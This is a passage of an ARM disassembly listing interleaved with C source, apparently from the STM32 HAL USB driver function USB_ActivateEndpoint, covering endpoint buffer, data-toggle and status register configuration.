 80060ea:	f203 4304 	addw	r3, r3, #1028	; 0x404
 80060ee:	62fb      	str	r3, [r7, #44]	; 0x2c
 80060f0:	683b      	ldr	r3, [r7, #0]
 80060f2:	88db      	ldrh	r3, [r3, #6]
 80060f4:	085b      	lsrs	r3, r3, #1
 80060f6:	b29b      	uxth	r3, r3
 80060f8:	005b      	lsls	r3, r3, #1
 80060fa:	b29a      	uxth	r2, r3
 80060fc:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 80060fe:	801a      	strh	r2, [r3, #0]

      /* Set the endpoint Receive buffer counter */
      PCD_SET_EP_RX_CNT(USBx, ep->num, ep->maxpacket);
 8006100:	687b      	ldr	r3, [r7, #4]
 8006102:	62bb      	str	r3, [r7, #40]	; 0x28
 8006104:	687b      	ldr	r3, [r7, #4]
 8006106:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800610a:	b29b      	uxth	r3, r3
 800610c:	461a      	mov	r2, r3
 800610e:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006110:	4413      	add	r3, r2
 8006112:	62bb      	str	r3, [r7, #40]	; 0x28
 8006114:	683b      	ldr	r3, [r7, #0]
 8006116:	781b      	ldrb	r3, [r3, #0]
 8006118:	00da      	lsls	r2, r3, #3
 800611a:	6abb      	ldr	r3, [r7, #40]	; 0x28
 800611c:	4413      	add	r3, r2
 800611e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006122:	627b      	str	r3, [r7, #36]	; 0x24
 8006124:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006126:	881b      	ldrh	r3, [r3, #0]
 8006128:	b29b      	uxth	r3, r3
 800612a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800612e:	b29a      	uxth	r2, r3
 8006130:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006132:	801a      	strh	r2, [r3, #0]
 8006134:	683b      	ldr	r3, [r7, #0]
 8006136:	691b      	ldr	r3, [r3, #16]
 8006138:	2b3e      	cmp	r3, #62	; 0x3e
 800613a:	d91d      	bls.n	8006178 <USB_ActivateEndpoint+0x2b0>
 800613c:	683b      	ldr	r3, [r7, #0]
 800613e:	691b      	ldr	r3, [r3, #16]
 8006140:	095b      	lsrs	r3, r3, #5
 8006142:	66bb      	str	r3, [r7, #104]	; 0x68
 8006144:	683b      	ldr	r3, [r7, #0]
 8006146:	691b      	ldr	r3, [r3, #16]
 8006148:	f003 031f 	and.w	r3, r3, #31
 800614c:	2b00      	cmp	r3, #0
 800614e:	d102      	bne.n	8006156 <USB_ActivateEndpoint+0x28e>
 8006150:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8006152:	3b01      	subs	r3, #1
 8006154:	66bb      	str	r3, [r7, #104]	; 0x68
 8006156:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006158:	881b      	ldrh	r3, [r3, #0]
 800615a:	b29a      	uxth	r2, r3
 800615c:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800615e:	b29b      	uxth	r3, r3
 8006160:	029b      	lsls	r3, r3, #10
 8006162:	b29b      	uxth	r3, r3
 8006164:	4313      	orrs	r3, r2
 8006166:	b29b      	uxth	r3, r3
 8006168:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800616c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006170:	b29a      	uxth	r2, r3
 8006172:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006174:	801a      	strh	r2, [r3, #0]
 8006176:	e026      	b.n	80061c6 <USB_ActivateEndpoint+0x2fe>
 8006178:	683b      	ldr	r3, [r7, #0]
 800617a:	691b      	ldr	r3, [r3, #16]
 800617c:	2b00      	cmp	r3, #0
 800617e:	d10a      	bne.n	8006196 <USB_ActivateEndpoint+0x2ce>
 8006180:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006182:	881b      	ldrh	r3, [r3, #0]
 8006184:	b29b      	uxth	r3, r3
 8006186:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800618a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800618e:	b29a      	uxth	r2, r3
 8006190:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006192:	801a      	strh	r2, [r3, #0]
 8006194:	e017      	b.n	80061c6 <USB_ActivateEndpoint+0x2fe>
 8006196:	683b      	ldr	r3, [r7, #0]
 8006198:	691b      	ldr	r3, [r3, #16]
 800619a:	085b      	lsrs	r3, r3, #1
 800619c:	66bb      	str	r3, [r7, #104]	; 0x68
 800619e:	683b      	ldr	r3, [r7, #0]
 80061a0:	691b      	ldr	r3, [r3, #16]
 80061a2:	f003 0301 	and.w	r3, r3, #1
 80061a6:	2b00      	cmp	r3, #0
 80061a8:	d002      	beq.n	80061b0 <USB_ActivateEndpoint+0x2e8>
 80061aa:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80061ac:	3301      	adds	r3, #1
 80061ae:	66bb      	str	r3, [r7, #104]	; 0x68
 80061b0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80061b2:	881b      	ldrh	r3, [r3, #0]
 80061b4:	b29a      	uxth	r2, r3
 80061b6:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80061b8:	b29b      	uxth	r3, r3
 80061ba:	029b      	lsls	r3, r3, #10
 80061bc:	b29b      	uxth	r3, r3
 80061be:	4313      	orrs	r3, r2
 80061c0:	b29a      	uxth	r2, r3
 80061c2:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80061c4:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80061c6:	687a      	ldr	r2, [r7, #4]
 80061c8:	683b      	ldr	r3, [r7, #0]
 80061ca:	781b      	ldrb	r3, [r3, #0]
 80061cc:	009b      	lsls	r3, r3, #2
 80061ce:	4413      	add	r3, r2
 80061d0:	881b      	ldrh	r3, [r3, #0]
 80061d2:	847b      	strh	r3, [r7, #34]	; 0x22
 80061d4:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 80061d6:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80061da:	2b00      	cmp	r3, #0
 80061dc:	d01b      	beq.n	8006216 <USB_ActivateEndpoint+0x34e>
 80061de:	687a      	ldr	r2, [r7, #4]
 80061e0:	683b      	ldr	r3, [r7, #0]
 80061e2:	781b      	ldrb	r3, [r3, #0]
 80061e4:	009b      	lsls	r3, r3, #2
 80061e6:	4413      	add	r3, r2
 80061e8:	881b      	ldrh	r3, [r3, #0]
 80061ea:	b29b      	uxth	r3, r3
 80061ec:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80061f0:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80061f4:	843b      	strh	r3, [r7, #32]
 80061f6:	687a      	ldr	r2, [r7, #4]
 80061f8:	683b      	ldr	r3, [r7, #0]
 80061fa:	781b      	ldrb	r3, [r3, #0]
 80061fc:	009b      	lsls	r3, r3, #2
 80061fe:	441a      	add	r2, r3
 8006200:	8c3b      	ldrh	r3, [r7, #32]
 8006202:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006206:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800620a:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800620e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006212:	b29b      	uxth	r3, r3
 8006214:	8013      	strh	r3, [r2, #0]

      if (ep->num == 0U)
 8006216:	683b      	ldr	r3, [r7, #0]
 8006218:	781b      	ldrb	r3, [r3, #0]
 800621a:	2b00      	cmp	r3, #0
 800621c:	d124      	bne.n	8006268 <USB_ActivateEndpoint+0x3a0>
      {
        /* Configure VALID status for EP0 */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 800621e:	687a      	ldr	r2, [r7, #4]
 8006220:	683b      	ldr	r3, [r7, #0]
 8006222:	781b      	ldrb	r3, [r3, #0]
 8006224:	009b      	lsls	r3, r3, #2
 8006226:	4413      	add	r3, r2
 8006228:	881b      	ldrh	r3, [r3, #0]
 800622a:	b29b      	uxth	r3, r3
 800622c:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006230:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006234:	83bb      	strh	r3, [r7, #28]
 8006236:	8bbb      	ldrh	r3, [r7, #28]
 8006238:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 800623c:	83bb      	strh	r3, [r7, #28]
 800623e:	8bbb      	ldrh	r3, [r7, #28]
 8006240:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8006244:	83bb      	strh	r3, [r7, #28]
 8006246:	687a      	ldr	r2, [r7, #4]
 8006248:	683b      	ldr	r3, [r7, #0]
 800624a:	781b      	ldrb	r3, [r3, #0]
 800624c:	009b      	lsls	r3, r3, #2
 800624e:	441a      	add	r2, r3
 8006250:	8bbb      	ldrh	r3, [r7, #28]
 8006252:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006256:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800625a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800625e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006262:	b29b      	uxth	r3, r3
 8006264:	8013      	strh	r3, [r2, #0]
 8006266:	e1ea      	b.n	800663e <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure NAK status for OUT Endpoint */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_NAK);
 8006268:	687a      	ldr	r2, [r7, #4]
 800626a:	683b      	ldr	r3, [r7, #0]
 800626c:	781b      	ldrb	r3, [r3, #0]
 800626e:	009b      	lsls	r3, r3, #2
 8006270:	4413      	add	r3, r2
 8006272:	881b      	ldrh	r3, [r3, #0]
 8006274:	b29b      	uxth	r3, r3
 8006276:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800627a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800627e:	83fb      	strh	r3, [r7, #30]
 8006280:	8bfb      	ldrh	r3, [r7, #30]
 8006282:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8006286:	83fb      	strh	r3, [r7, #30]
 8006288:	687a      	ldr	r2, [r7, #4]
 800628a:	683b      	ldr	r3, [r7, #0]
 800628c:	781b      	ldrb	r3, [r3, #0]
 800628e:	009b      	lsls	r3, r3, #2
 8006290:	441a      	add	r2, r3
 8006292:	8bfb      	ldrh	r3, [r7, #30]
 8006294:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006298:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800629c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80062a0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80062a4:	b29b      	uxth	r3, r3
 80062a6:	8013      	strh	r3, [r2, #0]
 80062a8:	e1c9      	b.n	800663e <USB_ActivateEndpoint+0x776>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->type == EP_TYPE_BULK)
 80062aa:	683b      	ldr	r3, [r7, #0]
 80062ac:	78db      	ldrb	r3, [r3, #3]
 80062ae:	2b02      	cmp	r3, #2
 80062b0:	d11e      	bne.n	80062f0 <USB_ActivateEndpoint+0x428>
    {
      /* Set bulk endpoint as double buffered */
      PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 80062b2:	687a      	ldr	r2, [r7, #4]
 80062b4:	683b      	ldr	r3, [r7, #0]
 80062b6:	781b      	ldrb	r3, [r3, #0]
 80062b8:	009b      	lsls	r3, r3, #2
 80062ba:	4413      	add	r3, r2
 80062bc:	881b      	ldrh	r3, [r3, #0]
 80062be:	b29b      	uxth	r3, r3
 80062c0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80062c4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80062c8:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 80062cc:	687a      	ldr	r2, [r7, #4]
 80062ce:	683b      	ldr	r3, [r7, #0]
 80062d0:	781b      	ldrb	r3, [r3, #0]
 80062d2:	009b      	lsls	r3, r3, #2
 80062d4:	441a      	add	r2, r3
 80062d6:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 80062da:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80062de:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80062e2:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 80062e6:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80062ea:	b29b      	uxth	r3, r3
 80062ec:	8013      	strh	r3, [r2, #0]
 80062ee:	e01d      	b.n	800632c <USB_ActivateEndpoint+0x464>
    }
    else
    {
      /* Set the ISOC endpoint in double buffer mode */
      PCD_CLEAR_EP_KIND(USBx, ep->num);
 80062f0:	687a      	ldr	r2, [r7, #4]
 80062f2:	683b      	ldr	r3, [r7, #0]
 80062f4:	781b      	ldrb	r3, [r3, #0]
 80062f6:	009b      	lsls	r3, r3, #2
 80062f8:	4413      	add	r3, r2
 80062fa:	881b      	ldrh	r3, [r3, #0]
 80062fc:	b29b      	uxth	r3, r3
 80062fe:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 8006302:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006306:	f8a7 3064 	strh.w	r3, [r7, #100]	; 0x64
 800630a:	687a      	ldr	r2, [r7, #4]
 800630c:	683b      	ldr	r3, [r7, #0]
 800630e:	781b      	ldrb	r3, [r3, #0]
 8006310:	009b      	lsls	r3, r3, #2
 8006312:	441a      	add	r2, r3
 8006314:	f8b7 3064 	ldrh.w	r3, [r7, #100]	; 0x64
 8006318:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800631c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006320:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006324:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006328:	b29b      	uxth	r3, r3
 800632a:	8013      	strh	r3, [r2, #0]
    }

    /* Set buffer address for double buffered mode */
    PCD_SET_EP_DBUF_ADDR(USBx, ep->num, ep->pmaaddr0, ep->pmaaddr1);
 800632c:	687b      	ldr	r3, [r7, #4]
 800632e:	65fb      	str	r3, [r7, #92]	; 0x5c
 8006330:	687b      	ldr	r3, [r7, #4]
 8006332:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006336:	b29b      	uxth	r3, r3
 8006338:	461a      	mov	r2, r3
 800633a:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 800633c:	4413      	add	r3, r2
 800633e:	65fb      	str	r3, [r7, #92]	; 0x5c
 8006340:	683b      	ldr	r3, [r7, #0]
 8006342:	781b      	ldrb	r3, [r3, #0]
 8006344:	00da      	lsls	r2, r3, #3
 8006346:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8006348:	4413      	add	r3, r2
 800634a:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 800634e:	65bb      	str	r3, [r7, #88]	; 0x58
 8006350:	683b      	ldr	r3, [r7, #0]
 8006352:	891b      	ldrh	r3, [r3, #8]
 8006354:	085b      	lsrs	r3, r3, #1
 8006356:	b29b      	uxth	r3, r3
 8006358:	005b      	lsls	r3, r3, #1
 800635a:	b29a      	uxth	r2, r3
 800635c:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800635e:	801a      	strh	r2, [r3, #0]
 8006360:	687b      	ldr	r3, [r7, #4]
 8006362:	657b      	str	r3, [r7, #84]	; 0x54
 8006364:	687b      	ldr	r3, [r7, #4]
 8006366:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800636a:	b29b      	uxth	r3, r3
 800636c:	461a      	mov	r2, r3
 800636e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8006370:	4413      	add	r3, r2
 8006372:	657b      	str	r3, [r7, #84]	; 0x54
 8006374:	683b      	ldr	r3, [r7, #0]
 8006376:	781b      	ldrb	r3, [r3, #0]
 8006378:	00da      	lsls	r2, r3, #3
 800637a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800637c:	4413      	add	r3, r2
 800637e:	f203 4304 	addw	r3, r3, #1028	; 0x404
 8006382:	653b      	str	r3, [r7, #80]	; 0x50
 8006384:	683b      	ldr	r3, [r7, #0]
 8006386:	895b      	ldrh	r3, [r3, #10]
 8006388:	085b      	lsrs	r3, r3, #1
 800638a:	b29b      	uxth	r3, r3
 800638c:	005b      	lsls	r3, r3, #1
 800638e:	b29a      	uxth	r2, r3
 8006390:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8006392:	801a      	strh	r2, [r3, #0]

    if (ep->is_in == 0U)
 8006394:	683b      	ldr	r3, [r7, #0]
 8006396:	785b      	ldrb	r3, [r3, #1]
 8006398:	2b00      	cmp	r3, #0
 800639a:	f040 8093 	bne.w	80064c4 <USB_ActivateEndpoint+0x5fc>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 800639e:	687a      	ldr	r2, [r7, #4]
 80063a0:	683b      	ldr	r3, [r7, #0]
 80063a2:	781b      	ldrb	r3, [r3, #0]
 80063a4:	009b      	lsls	r3, r3, #2
 80063a6:	4413      	add	r3, r2
 80063a8:	881b      	ldrh	r3, [r3, #0]
 80063aa:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40
 80063ae:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 80063b2:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80063b6:	2b00      	cmp	r3, #0
 80063b8:	d01b      	beq.n	80063f2 <USB_ActivateEndpoint+0x52a>
 80063ba:	687a      	ldr	r2, [r7, #4]
 80063bc:	683b      	ldr	r3, [r7, #0]
 80063be:	781b      	ldrb	r3, [r3, #0]
 80063c0:	009b      	lsls	r3, r3, #2
 80063c2:	4413      	add	r3, r2
 80063c4:	881b      	ldrh	r3, [r3, #0]
 80063c6:	b29b      	uxth	r3, r3
 80063c8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80063cc:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80063d0:	87fb      	strh	r3, [r7, #62]	; 0x3e
 80063d2:	687a      	ldr	r2, [r7, #4]
 80063d4:	683b      	ldr	r3, [r7, #0]
 80063d6:	781b      	ldrb	r3, [r3, #0]
 80063d8:	009b      	lsls	r3, r3, #2
 80063da:	441a      	add	r2, r3
 80063dc:	8ffb      	ldrh	r3, [r7, #62]	; 0x3e
 80063de:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80063e2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80063e6:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80063ea:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80063ee:	b29b      	uxth	r3, r3
 80063f0:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80063f2:	687a      	ldr	r2, [r7, #4]
 80063f4:	683b      	ldr	r3, [r7, #0]
 80063f6:	781b      	ldrb	r3, [r3, #0]
 80063f8:	009b      	lsls	r3, r3, #2
 80063fa:	4413      	add	r3, r2
 80063fc:	881b      	ldrh	r3, [r3, #0]
 80063fe:	87bb      	strh	r3, [r7, #60]	; 0x3c
 8006400:	8fbb      	ldrh	r3, [r7, #60]	; 0x3c
 8006402:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006406:	2b00      	cmp	r3, #0
 8006408:	d01b      	beq.n	8006442 <USB_ActivateEndpoint+0x57a>
 800640a:	687a      	ldr	r2, [r7, #4]
 800640c:	683b      	ldr	r3, [r7, #0]
 800640e:	781b      	ldrb	r3, [r3, #0]
 8006410:	009b      	lsls	r3, r3, #2
 8006412:	4413      	add	r3, r2
 8006414:	881b      	ldrh	r3, [r3, #0]
 8006416:	b29b      	uxth	r3, r3
 8006418:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800641c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006420:	877b      	strh	r3, [r7, #58]	; 0x3a
 8006422:	687a      	ldr	r2, [r7, #4]
 8006424:	683b      	ldr	r3, [r7, #0]
 8006426:	781b      	ldrb	r3, [r3, #0]
 8006428:	009b      	lsls	r3, r3, #2
 800642a:	441a      	add	r2, r3
 800642c:	8f7b      	ldrh	r3, [r7, #58]	; 0x3a
 800642e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006432:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006436:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800643a:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800643e:	b29b      	uxth	r3, r3
 8006440:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 8006442:	687a      	ldr	r2, [r7, #4]
 8006444:	683b      	ldr	r3, [r7, #0]
 8006446:	781b      	ldrb	r3, [r3, #0]
 8006448:	009b      	lsls	r3, r3, #2
 800644a:	4413      	add	r3, r2
 800644c:	881b      	ldrh	r3, [r3, #0]
 800644e:	b29b      	uxth	r3, r3
 8006450:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006454:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006458:	873b      	strh	r3, [r7, #56]	; 0x38
 800645a:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 800645c:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8006460:	873b      	strh	r3, [r7, #56]	; 0x38
 8006462:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 8006464:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8006468:	873b      	strh	r3, [r7, #56]	; 0x38
 800646a:	687a      	ldr	r2, [r7, #4]
 800646c:	683b      	ldr	r3, [r7, #0]
 800646e:	781b      	ldrb	r3, [r3, #0]
 8006470:	009b      	lsls	r3, r3, #2
 8006472:	441a      	add	r2, r3
 8006474:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 8006476:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800647a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800647e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006482:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006486:	b29b      	uxth	r3, r3
 8006488:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 800648a:	687a      	ldr	r2, [r7, #4]
 800648c:	683b      	ldr	r3, [r7, #0]
 800648e:	781b      	ldrb	r3, [r3, #0]
 8006490:	009b      	lsls	r3, r3, #2
 8006492:	4413      	add	r3, r2
 8006494:	881b      	ldrh	r3, [r3, #0]
 8006496:	b29b      	uxth	r3, r3
 8006498:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800649c:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80064a0:	86fb      	strh	r3, [r7, #54]	; 0x36
 80064a2:	687a      	ldr	r2, [r7, #4]
 80064a4:	683b      	ldr	r3, [r7, #0]
 80064a6:	781b      	ldrb	r3, [r3, #0]
 80064a8:	009b      	lsls	r3, r3, #2
 80064aa:	441a      	add	r2, r3
 80064ac:	8efb      	ldrh	r3, [r7, #54]	; 0x36
 80064ae:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80064b2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80064b6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80064ba:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80064be:	b29b      	uxth	r3, r3
 80064c0:	8013      	strh	r3, [r2, #0]
 80064c2:	e0bc      	b.n	800663e <USB_ActivateEndpoint+0x776>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80064c4:	687a      	ldr	r2, [r7, #4]
 80064c6:	683b      	ldr	r3, [r7, #0]
 80064c8:	781b      	ldrb	r3, [r3, #0]
 80064ca:	009b      	lsls	r3, r3, #2
 80064cc:	4413      	add	r3, r2
 80064ce:	881b      	ldrh	r3, [r3, #0]
 80064d0:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 80064d4:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 80064d8:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80064dc:	2b00      	cmp	r3, #0
 80064de:	d01d      	beq.n	800651c <USB_ActivateEndpoint+0x654>
 80064e0:	687a      	ldr	r2, [r7, #4]
 80064e2:	683b      	ldr	r3, [r7, #0]
 80064e4:	781b      	ldrb	r3, [r3, #0]
 80064e6:	009b      	lsls	r3, r3, #2
 80064e8:	4413      	add	r3, r2
 80064ea:	881b      	ldrh	r3, [r3, #0]
 80064ec:	b29b      	uxth	r3, r3
 80064ee:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80064f2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80064f6:	f8a7 304c 	strh.w	r3, [r7, #76]	; 0x4c
 80064fa:	687a      	ldr	r2, [r7, #4]
 80064fc:	683b      	ldr	r3, [r7, #0]
 80064fe:	781b      	ldrb	r3, [r3, #0]
 8006500:	009b      	lsls	r3, r3, #2
 8006502:	441a      	add	r2, r3
 8006504:	f8b7 304c 	ldrh.w	r3, [r7, #76]	; 0x4c
 8006508:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800650c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006510:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006514:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006518:	b29b      	uxth	r3, r3
 800651a:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 800651c:	687a      	ldr	r2, [r7, #4]
 800651e:	683b      	ldr	r3, [r7, #0]
 8006520:	781b      	ldrb	r3, [r3, #0]
 8006522:	009b      	lsls	r3, r3, #2
 8006524:	4413      	add	r3, r2
 8006526:	881b      	ldrh	r3, [r3, #0]
 8006528:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a
 800652c:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8006530:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006534:	2b00      	cmp	r3, #0
 8006536:	d01d      	beq.n	8006574 <USB_ActivateEndpoint+0x6ac>
 8006538:	687a      	ldr	r2, [r7, #4]
 800653a:	683b      	ldr	r3, [r7, #0]
 800653c:	781b      	ldrb	r3, [r3, #0]
 800653e:	009b      	lsls	r3, r3, #2
 8006540:	4413      	add	r3, r2
 8006542:	881b      	ldrh	r3, [r3, #0]
 8006544:	b29b      	uxth	r3, r3
 8006546:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800654a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800654e:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 8006552:	687a      	ldr	r2, [r7, #4]
 8006554:	683b      	ldr	r3, [r7, #0]
 8006556:	781b      	ldrb	r3, [r3, #0]
 8006558:	009b      	lsls	r3, r3, #2
 800655a:	441a      	add	r2, r3
 800655c:	f8b7 3048 	ldrh.w	r3, [r7, #72]	; 0x48
 8006560:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006564:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006568:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800656c:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006570:	b29b      	uxth	r3, r3
 8006572:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 8006574:	683b      	ldr	r3, [r7, #0]
 8006576:	78db      	ldrb	r3, [r3, #3]
 8006578:	2b01      	cmp	r3, #1
 800657a:	d024      	beq.n	80065c6 <USB_ActivateEndpoint+0x6fe>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 800657c:	687a      	ldr	r2, [r7, #4]
 800657e:	683b      	ldr	r3, [r7, #0]
 8006580:	781b      	ldrb	r3, [r3, #0]
 8006582:	009b      	lsls	r3, r3, #2
 8006584:	4413      	add	r3, r2
 8006586:	881b      	ldrh	r3, [r3, #0]
 8006588:	b29b      	uxth	r3, r3
 800658a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800658e:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006592:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 8006596:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 800659a:	f083 0320 	eor.w	r3, r3, #32
 800659e:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 80065a2:	687a      	ldr	r2, [r7, #4]
 80065a4:	683b      	ldr	r3, [r7, #0]
 80065a6:	781b      	ldrb	r3, [r3, #0]
 80065a8:	009b      	lsls	r3, r3, #2
 80065aa:	441a      	add	r2, r3
 80065ac:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 80065b0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80065b4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80065b8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80065bc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80065c0:	b29b      	uxth	r3, r3
 80065c2:	8013      	strh	r3, [r2, #0]
 80065c4:	e01d      	b.n	8006602 <USB_ActivateEndpoint+0x73a>
      }
      else
      {
